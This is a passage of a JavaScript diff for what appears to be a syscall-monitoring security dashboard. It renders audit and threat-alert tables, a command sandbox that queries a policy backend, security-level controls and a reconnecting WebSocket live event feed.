+      <td style="color:var(--accent);font-weight:600">${m.icon} ${e.syscall}</td>
+      <td>${catPill(e.category)}</td>
+      <td>${e.process}</td>
+      <td class="muted">${e.pid}</td>
+      <td>${modeBadge(e.blocked ? 'blocked' : 'allowed')}</td>
+      <td>${flags || '—'}</td>
+      <td class="muted" style="font-size:9px;max-width:110px;overflow:hidden;text-overflow:ellipsis">${e.args || '—'}</td>
+    </tr>`;
+  }).join('');
+}
+window.loadAudit = loadAudit;
+
+// ── Threats ───────────────────────────────────────────────────────────────────
+async function loadThreats(severity = '') {
+  let url = '/api/threats?limit=80';
+  if (severity) url += `&severity=${severity}`;
+
+  const threats = await apiFetch(url);
+  const el = document.getElementById('threat-list');
+  if (!el) return;
+
+  if (!threats || !threats.length) {
+    el.innerHTML = '<p class="muted" style="padding:14px;font-size:11px">No threat alerts recorded.</p>';
+    return;
+  }
+
+  // Update badge
+  threatCount = threats.length;
+  const badge = document.getElementById('threat-badge');
+  if (badge) {
+    badge.textContent = threatCount > 99 ? '99+' : threatCount;
+    badge.style.display = threatCount > 0 ? 'inline-block' : 'none';
+  }
+
+  el.innerHTML = threats.map(t => {
+    const m = CAT_META[t.category] || { icon: '⚠️' };
+    const extras = [
+      t.priv_esc  ? '<span class="badge badge-critical">PRIV-ESC</span>' : '',
+      t.rate_flag ? '<span class="badge badge-high">RATE-LIMIT</span>'   : '',
+    ].filter(Boolean).join(' ');
+    return `<div class="threat-item ${t.severity}">
+      <div class="threat-icon">${SEV_ICON[t.severity] || '⚠️'}</div>
+      <div class="threat-body">
+        <div class="threat-msg">
+          <span class="badge badge-${t.severity}">${t.severity.toUpperCase()}</span>
+          ${extras}
+          <span style="margin-left:8px">${t.message}</span>
+        </div>
+        <div class="threat-meta">
+          <span>${m.icon} ${t.category}</span>
+          <span>syscall: <strong>${t.syscall}</strong></span>
+          <span>${shortTime(t.time)} UTC</span>
+        </div>
+      </div>
+    </div>`;
+  }).join('');
+}
+window.loadThreats = loadThreats;
+
+async function clearThreats() {
+  if (!confirm('Clear all threat alerts?')) return;
+  await apiFetch('/api/threats', 'DELETE');
+  loadThreats('');
+}
+window.clearThreats = clearThreats;
+
+// ── Sandbox ───────────────────────────────────────────────────────────────────
+window.runSandbox = async function () {
+  const inp = document.getElementById('cmd-input');
+  const out  = document.getElementById('sandbox-out');
+  if (!inp || !out) return;
+  const cmd = inp.value.trim();
+  if (!cmd) return;
+
+  out.innerHTML = '<span class="muted">⏳ Evaluating against active policies…</span>';
+
+  const res = await apiFetch('/api/sandbox/run', 'POST', { command: cmd });
+  if (!res) {
+    out.innerHTML = '<span style="color:var(--m-blocked)">❌ Error contacting backend.</span>';
+    return;
+  }
+
+  const isBlock = res.decision === 'BLOCK';
+  const cls     = isBlock ? 'verdict-block' : 'verdict-allow';
+  const icon    = isBlock ? '✗' : '✓';
+
+  out.innerHTML = `
+    <div class="${cls}" style="font-size:22px;font-weight:700;margin-bottom:14px;
+         font-family:var(--font-display);letter-spacing:2px">
+      ${icon} ${res.decision}
+    </div>
+    <div style="display:grid;grid-template-columns:110px 1fr;gap:8px 12px;font-size:11px;
+         align-items:start">
+      <span class="muted">Command</span>
+      <span style="color:var(--text-primary);font-weight:600">${res.command}</span>
+      <span class="muted">Reason</span>
+      <span>${res.reason}</span>
+      <span class="muted">Risk Score</span>
+      <span>${riskBar(res.risk_score)}</span>
+      <span class="muted">Category</span>
+      <span>${res.cmd_parsed || '—'}</span>
+      <span class="muted">Timestamp</span>
+      <span class="muted" style="font-size:9px">${shortTime(res.timestamp)} UTC</span>
+      ${res.blocked_syscalls?.length ? `
+        <span class="muted">Blocked<br>Syscalls</span>
+        <span>${res.blocked_syscalls.map(s =>
+          `<span class="badge badge-blocked" style="margin:2px 2px 0 0">${s}</span>`
+        ).join('')}</span>` : ''}
+    </div>`;
+};
+
+window.quickTest = function (cmd) {
+  const inp = document.getElementById('cmd-input');
+  if (inp) inp.value = cmd;
+  window.runSandbox();
+};
+
+// ── Security level ────────────────────────────────────────────────────────────
+window.setSecLevel = async function (level) {
+  await apiFetch('/api/security-level', 'PUT', { level });
+  await refreshStatus();
+  // Reload syscalls in case modes changed
+  if (document.getElementById('tab-syscalls')?.classList.contains('active')) {
+    loadSyscalls();
+  }
+};
+
+// ── WebSocket live feed ───────────────────────────────────────────────────────
+function connectWS() {
+  try {
+    ws = new WebSocket(WS_URL);
+  } catch (e) {
+    scheduleReconnect();
+    return;
+  }
+
+  const dot = document.getElementById('ws-dot');
+  const lbl = document.getElementById('ws-lbl');
+
+  ws.onopen = () => {
+    wsRetries = 0;
+    if (dot) { dot.className = 'ws-dot on'; }
+    if (lbl)   lbl.textContent = 'LIVE';
+    // Ping keepalive every 25s
+    ws._pingInterval = setInterval(() => {
+      if (ws.readyState === WebSocket.OPEN) ws.send('ping');
+    }, 25000);
   };
-  state.ws.onerror = () => state.ws.close();
-  state.ws.onclose = () => setTimeout(connectLiveStream, 3000);
+
+  ws.onmessage = (e) => {
+    let msg;
+    try { msg = JSON.parse(e.data); } catch { return; }
+
+    if (msg.type === 'pong' || msg.type === 'heartbeat') return;
+
+    if (msg.type === 'snapshot') {
+      // Initial snapshot — sync local caches
+      if (msg.data?.syscalls) syscallCache = msg.data.syscalls;
+      return;
+    }
+
+    if (msg.type !== 'syscall_event') return;
+
+    const ev = msg.data;
+    feedCount++;
+    const fc = document.getElementById('feed-count');
+    if (fc) fc.textContent = fmt(feedCount) + ' events';
+
+    // Update rolling rate chart data
+    rateData.shift();
+    rateData.push(feedCount % 10);  // cosmetic tick
+
+    const feed = document.getElementById('live-feed');
+    if (!feed) return;
+
+    const m   = CAT_META[ev.category] || { icon: '?', color: 'var(--text-primary)' };
+    const row = document.createElement('div');
+    row.className = `feed-row ${ev.blocked ? 'blocked' : ev.mode}`;
+
+    const flags = [
+      ev.priv_esc  ? '<span class="badge badge-critical" style="font-size:8px">PE</span>' : '',
+      ev.rate_flag ? '<span class="badge badge-high"     style="font-size:8px">RL</span>' : '',
+    ].filter(Boolean).join('');
+
+    row.innerHTML = `
+      <span class="feed-time">${shortTime(ev.time)}</span>
+      <span class="feed-call" style="color:${m.color}">${m.icon} ${ev.syscall}</span>
+      <span class="feed-proc">${ev.process}</span>
+      <span class="feed-pid muted">${ev.pid}</span>
+      <span>${flags}${ev.blocked
+        ? '<span class="badge badge-blocked">BLOCKED</span>'
+        : `<span class="badge badge-${ev.mode}">${ev.mode.slice(0, 3).toUpperCase()}</span>`
+      }</span>`;
+
+    feed.prepend(row);
+    // Cap feed at 120 visible rows
+    while (feed.children.length > 120) feed.lastChild.remove();
+
+    // Auto-update threat badge if on threats tab
+    if (ev.blocked && (ev.priv_esc || ev.rate_flag)) {
+      threatCount++;
+      const badge = document.getElementById('threat-badge');
+      if (badge) {
+        badge.textContent = threatCount > 99 ? '99+' : threatCount;
+        badge.style.display = 'inline-block';
+      }
+    }
+  };
+
+  ws.onclose = () => {
+    clearInterval(ws._pingInterval);
+    if (dot) { dot.className = 'ws-dot off'; }
+    if (lbl) lbl.textContent = 'OFFLINE';
+    scheduleReconnect();
+  };
+
+  ws.onerror = () => ws.close();
 }
 
+function scheduleReconnect() {
+  const delay = Math.min(30000, 1000 * Math.pow(1.5, wsRetries++));
+  setTimeout(connectWS, delay);
+}
+
+// ── Bootstrap ─────────────────────────────────────────────────────────────────
 async function init() {
-  updateClock();
-  initChart();
-  await Promise.all([
-    refreshStatus(),
-    refreshLog(),
-    refreshProcesses(),
-    refreshPolicies(),
-    refreshSyscalls(),
-    refreshAudit(),
-    refreshThreats()
-  ]);
-  connectLiveStream();
-  setInterval(updateClock, 1000);
-  setInterval(refreshStatus, 2500);
-  setInterval(refreshProcesses, 3500);
-  setInterval(refreshAudit, 5000);
-  setInterval(refreshThreats, 5000);
-  document.querySelectorAll('input[name="seclevel"]').forEach(input => {
-    input.addEventListener('change', event => setSecurityLevel(event.target.value));
+  await refreshStatus();
+  await refreshCategoryStats();
+  await refreshProcesses();
+  connectWS();
+
+  // Uptime ticker
+  setInterval(() => {
+    uptimeBase++;
+    renderUptime();
+  }, 1000);
+
+  // Analytics chart resize
+  window.addEventListener('resize', () => {
+    if (document.getElementById('tab-analytics')?.classList.contains('active')) {
+      drawRateChart();
+    }
   });
+
+  // Periodic background polls
+  setInterval(refreshStatus,        5000);
+  setInterval(refreshCategoryStats, 12000);
+  setInterval(refreshProcesses,     15000);
+  setInterval(() => {
+    if (document.getElementById('tab-analytics')?.classList.contains('active')) {
+      loadAnalytics();
+    }
+  }, 8000);
 }
 
-window.addEventListener('load', init);
+document.addEventListener('DOMContentLoaded', init);
